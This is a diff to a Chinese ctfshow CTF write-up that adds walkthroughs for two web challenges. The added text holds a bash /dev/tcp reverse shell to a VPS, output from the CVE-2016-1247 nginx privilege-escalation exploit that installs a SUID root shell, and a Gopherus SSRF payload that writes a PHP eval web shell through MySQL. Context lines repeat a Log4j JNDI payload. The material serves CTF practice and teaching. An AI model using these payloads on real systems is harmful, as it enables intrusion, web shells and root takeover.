@@ -7039,6 +7039,8 @@ drwxr-xr-x    2 www-data www-data      4096 Jan 23 01:10 uploads
 
 > 阿呆开发了自己的博客系统，准备对欺负他的大佬口吐芬芳。
 
+ctfshow中还有一道名为`【nl】难了`的web题跟这道题的解法一致。
+
 PHP代码审计，靶机的源码如下：
 
 ```php+HTML
@@ -8769,7 +8771,7 @@ Listening on 0.0.0.0 9999
 
 该漏洞的`POC`是`user=${jndi:ldap://34.169.108.13:1389/TomcatBypass/TomcatEcho}`。该`POC`能进行回显显示，使用`cmd: ls /`和`cmd: cat /ctfshowflag`可以验证`Log4j`漏洞并拿到`flag`。
 
-用`bash -i >& /dev/tcp/34.169.108.13/9999 0>&1`命令反弹`shell`，简单来说是将标准输出重定向到`/dev/tcp/34.169.108.13/9999`端口文件中，即将靶机的标准输出通过`/dev/tcp`建立`Socket`连接重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此靶机的标准输入也就重定向到了攻击机，所以我们能在攻击机（我们的VPS）中输入命令并看到靶机的执行结果。将反弹`shell`的命令进行`base64`编码，
+用`bash -i >& /dev/tcp/34.169.108.13/9999 0>&1`命令反弹`shell`，简单来说是将标准输出重定向到`/dev/tcp/34.169.108.13/9999`端口文件中，即将靶机的标准输出通过`/dev/tcp`建立`Socket`连接重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此靶机的标准输入也就重定向到了攻击机，所以我们能在攻击机（我们的VPS）中输入命令并看到靶机的执行结果。将反弹`shell`的命令进行`base64`编码。
 
 ```python
 >>> from base64 import b64encode
@@ -8888,6 +8890,296 @@ ctfshow{d12bb9d8-7e52-4b4a-8804-8efbda591cad}
 如果`jndi`关键字被屏蔽，绕过方法是`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ip:port/TomcatBypass/Command/Base64/xxxx`。
 
 提交`ctfshow{d12bb9d8-7e52-4b4a-8804-8efbda591cad}`即可。
+
+------
+
+### 出题人不想跟你说话.jpg
+
+> 为了降低难度，漏洞大约每两分钟触发一次
+>
+> hint1: whoami && ls -l /
+>
+> hint2:如你们所说，提权，看看服务器有什么服务
+
+靶机的源代码如下：
+
+```html
+<!DOCTYPE HTML>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>除了会连菜刀你还会个啥</title>
+</head>
+<body style="background-image:url('emoji.png');background-repeat:no-repeat;">
+</body>
+</html>
+```
+
+`title`暗示我们要连菜刀，图片中的人是英雄联盟中的蒙多医生，他扔出了一把菜刀上面写着`cai`。
+
+用`AntSword`连接靶机，连接密码是`cai`，右键打开虚拟终端，发现`flag`文件需要`root`权限才能读取。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux b79110d1c590 5.4.0-163-generic #180-Ubuntu SMP Tue Sep 5 13:21:23 UTC 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ whoami && ls -l /
+www-data
+total 76
+drwxr-xr-x   1 root root 4096 Mar 26  2020 bin
+drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
+drwxr-xr-x   5 root root  340 Jan 26 03:43 dev
+drwxr-xr-x   1 root root 4096 Jan 26 04:00 etc
+-rwx------   1 root root   46 Jan 26 03:43 flag
+drwxr-xr-x   2 root root 4096 Apr 10  2014 home
+drwxr-xr-x   1 root root 4096 Nov 19  2016 lib
+drwxr-xr-x   2 root root 4096 Sep 23  2016 lib64
+drwxr-xr-x   2 root root 4096 Sep 23  2016 media
+drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
+drwxr-xr-x   2 root root 4096 Sep 23  2016 opt
+dr-xr-xr-x 759 root root    0 Jan 26 03:43 proc
+drwx------   1 root root 4096 Mar 26  2020 root
+drwxr-xr-x   1 root root 4096 Jan 26 03:43 run
+drwxr-xr-x   1 root root 4096 Sep 26  2016 sbin
+drwxr-xr-x   2 root root 4096 Sep 23  2016 srv
+dr-xr-xr-x  13 root root    0 Jan  3 05:13 sys
+drwxrwxrwt   1 root root 4096 Jan 26 04:15 tmp
+drwxr-xr-x   1 root root 4096 Nov 19  2016 usr
+drwxr-xr-x   1 root root 4096 Mar 26  2020 var
+```
+
+`hint`又暗示我们需要提权，漏洞大约每两分钟触发一次。盲猜有定时任务，`cat /etc/crontab`发现了确实有定时任务，在网上一番搜索发现`nginx`提权漏洞[CVE-2016-1247](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)，并且靶机的`nginx`版本在该漏洞的受影响范围中。
+
+```bash
+(www-data:/var/www/html) $ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+# m h dom mon dow user    command
+17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*/1 *    * * *    root    /usr/sbin/logrotate -vf /etc/logrotate.d/nginx
+(www-data:/var/www/html) $ nginx -v
+nginx version: nginx/1.4.6 (Ubuntu)
+```
+
+从https://www.seebug.org/vuldb/ssvid-92538下载该漏洞的`POC`，从`AntSword`上传到靶机中。
+
+我们需要一台`VPS`用于反弹shell。先在Google Cloud启动VPS，然后用`gcloud`连接VPS。
+
+```bash
+gcloud compute ssh --zone "us-west1-a" "ctf-vps" --project "project-ip"
+```
+
+在VPS中输入`nc -lvnp port`监听端口，比如我在`Google Cloud`中的`ctf-vps`的`IP`是`34.19.3.124`。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+```
+
+在`AntSword`操控靶机的虚拟终端，用`bash -i >& /dev/tcp/34.19.3.124/9999 0>&1`命令反弹`shell`，简单来说是将标准输出重定向到`/dev/tcp/34.19.3.124/9999`端口文件中，即将靶机的标准输出通过`/dev/tcp`建立`Socket`连接重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此靶机的标准输入也就重定向到了攻击机，所以我们能在攻击机（我们的VPS）中输入命令并看到靶机的执行结果。
+
+```bash
+(www-data:/var/www/html) $ bash -i >& /dev/tcp/34.19.3.124/9999 0>&1
+```
+
+接着回到VPS终端，输入`./poc.sh /var/log/nginx/error.log`后等待漏洞触发即可拿到`root`权限。等到出现`nginxrootsh-4.3#`后说明进入交互，输入`whoami && ls -l /`看到已经是`root`了，所以再输入`cat /flag`能成功读取文件内容。
+
+```bash
+tyd@ctf-vps:~$ nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 124.223.158.81 35988                                     bash: cannot set terminal process group (19): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@b79110d1c590:~/html$ ./poc.sh /var/log/nginx/error.log
+./poc.sh /var/log/nginx/error.log
+ _______________________________
+< Is your server (N)jinxed ? ;o >
+ -------------------------------
+           \
+            \          __---__
+                    _-       /--______
+               __--( /     \ )XXXXXXXXXXX\v.
+             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
+            /XXX(       U     )        XXXXXXX\
+          /XXXXX(              )--_  XXXXXXXXXXX\
+         /XXXXX/ (      O     )   XXXXXX   \XXXXX\
+         XXXXX/   /            XXXXXX   \__ \XXXXX
+         XXXXXX__/          XXXXXX         \__---->
+ ---___  XXX__/          XXXXXX      \__         /
+   \-  --__/   ___/\  XXXXXX            /  ___--/=
+    \-\    ___/    XXXXXX              '--- XXXXXX
+       \-\/XXX\ XXXXXX                      /XXXXX
+         \XXXXXXXXX   \                    /XXXXX/
+          \XXXXXX      >                 _/XXXXX/
+            \XXXXX--__/              __-- XXXX/
+             -XXXXXXXX---------------  XXXXXX-
+                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
+                  ""VXXXXXXXXXXXXXXXXXXV""
+
+Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)
+nginxed-root.sh (ver. 1.0)
+
+Discovered and coded by:
+Dawid Golunski
+https://legalhackers.com
+
+[+] Starting the exploit as:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Compiling the privesc shared library (/tmp/privesclib.c)
+
+[+] Backdoor/low-priv shell installed at:
+-rwxrwxrwx 1 root root 1021112 Jan 26 04:21 /tmp/nginxrootsh
+
+[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at:
+lrwxrwxrwx 1 www-data www-data 18 Jan 26 04:21 /var/log/nginx/error.log -> /etc/ld.so.preload
+
+[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
+[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges:
+-rw-r--r-- 1 www-data root 19 Jan 26 04:22 /etc/ld.so.preload
+
+[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload
+
+[+] The /etc/ld.so.preload file now contains:
+/tmp/privesclib.so
+
+[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
+-rwsrwxrwx 1 root root 1021112 Jan 26 04:21 /tmp/nginxrootsh
+
+[+] Rootshell got assigned root SUID perms at:
+-rwsrwxrwx 1 root root 1021112 Jan 26 04:21 /tmp/nginxrootsh
+
+The server is (N)jinxed ! ;) Got root via Nginx!
+
+[+] Spawning the rootshell /tmp/nginxrootsh now!
+
+nginxrootsh: cannot set terminal process group (19): Inappropriate ioctl for device
+nginxrootsh: no job control in this shell
+nginxrootsh-4.3# whoami && ls -l /
+whoami && ls -l /
+root
+total 76
+drwxr-xr-x   1 root root 4096 Mar 26  2020 bin
+drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
+drwxr-xr-x   5 root root  340 Jan 26 03:43 dev
+drwxr-xr-x   1 root root 4096 Jan 26 04:22 etc
+-rwx------   1 root root   46 Jan 26 03:43 flag
+drwxr-xr-x   2 root root 4096 Apr 10  2014 home
+drwxr-xr-x   1 root root 4096 Nov 19  2016 lib
+drwxr-xr-x   2 root root 4096 Sep 23  2016 lib64
+drwxr-xr-x   2 root root 4096 Sep 23  2016 media
+drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
+drwxr-xr-x   2 root root 4096 Sep 23  2016 opt
+dr-xr-xr-x 745 root root    0 Jan 26 03:43 proc
+drwx------   1 root root 4096 Mar 26  2020 root
+drwxr-xr-x   1 root root 4096 Jan 26 03:43 run
+drwxr-xr-x   1 root root 4096 Sep 26  2016 sbin
+drwxr-xr-x   2 root root 4096 Sep 23  2016 srv
+dr-xr-xr-x  13 root root    0 Jan  3 05:13 sys
+drwxrwxrwt   1 root root 4096 Jan 26 04:22 tmp
+drwxr-xr-x   1 root root 4096 Nov 19  2016 usr
+drwxr-xr-x   1 root root 4096 Mar 26  2020 var
+nginxrootsh-4.3# cat /flag
+cat /flag
+ctfshow{879b92f5-af3c-40dd-bb63-c6bcc0086d1a}
+```
+
+提交`ctfshow{879b92f5-af3c-40dd-bb63-c6bcc0086d1a}`即可。
+
+------
+
+### 红包赛第九弹
+
+靶机给出一个登录框，密码被默认填充了，账号输入`admin`，用`Burp Suite`抓包，发现`POST`数据是：
+
+```
+u=admin&returl=https%3A%2F%2F404.chall.ctf.show%2F
+```
+
+第二个输入框的参数并不是密码而是`returl`，SSRF漏洞实锤了。根据题目描述的3306推测是`mysql`，用[Gopherus](https://github.com/tarunkant/Gopherus)构造`Payload`，利用`SQL`将`PHP`一句话木马写入网站目录中的`.php`文件。
+
+我们想要执行的`SQL`语句如下：
+
+```sql
+SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+`Gopherus`的运行结果如下：
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tools]
+└─$ python2 Gopherus/gopherus.py --exploit mysql
+
+  ________              .__                                                       
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______                         
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                         
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                          
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                         
+        \/       |__|        \/     \/                 \/ 
+        
+        author: $_SpyD3r_$                                                 
+                                                                                   
+For making it work username should not be password protected!!!
+
+Give MySQL username: root
+Give query to execute: SELECT '<?php @eval($_POST["t0ur1st"]);?>' INTO OUTFILE '/var/www/html/shell.php';
+
+Your gopher link is ready to do SSRF :
+gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01
+
+-----------Made-by-SpyD3r-----------
+```
+
+用`Python`对gopher link再进行一次`URL`编码。
+
+```python
+>>> from urllib.parse import quote
+>>> quote('gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%53%00%00%00%03%53%45%4c%45%43%54%20%27%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%22%74%30%75%72%31%73%74%22%5d%29%3b%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%73%68%65%6c%6c%2e%70%68%70%27%3b%01%00%00%00%01')
+'gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501'
+```
+
+用`Burp Suite`抓包，将再次`URL`编码后的gopher link填入`returl`框中发送请求，在`Response`中看到`HTTP/1.1 200 OK`就说明`SSRF`漏洞利用成功，我们遂即可以访问靶机的`shell.php`。
+
+```
+POST /check.php HTTP/1.1
+Host: 3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
+Content-Length: 1339
+Cache-Control: max-age=0
+Origin: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://3eb7cf9b-520b-45f1-b89b-2c70266c00d8.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+u=admin&returl=gopher%3A//127.0.0.1%3A3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2553%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2527%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2522%2574%2530%2575%2572%2531%2573%2574%2522%255d%2529%253b%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2573%2568%2565%256c%256c%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
+```
+
+用`AntSword`连接靶机的`shell.php`，在文件管理中访问靶机根目录可以看到`/flag.txt`。
+
+或者用`HackBar`填充`POST`数据请求靶机的`shell.php`，`t0ur1st=system('ls /');`查看靶机根目录。
+
+> bin dev etc flag.sh flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
+
+`t0ur1st=system('cat /flag.txt');`查看`/flag.txt`文件内容。
+
+> ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}
+
+提交`ctfshow{c5187c11-5ff4-4558-b402-32bcf09325d7}`即可。
 
 ------
 
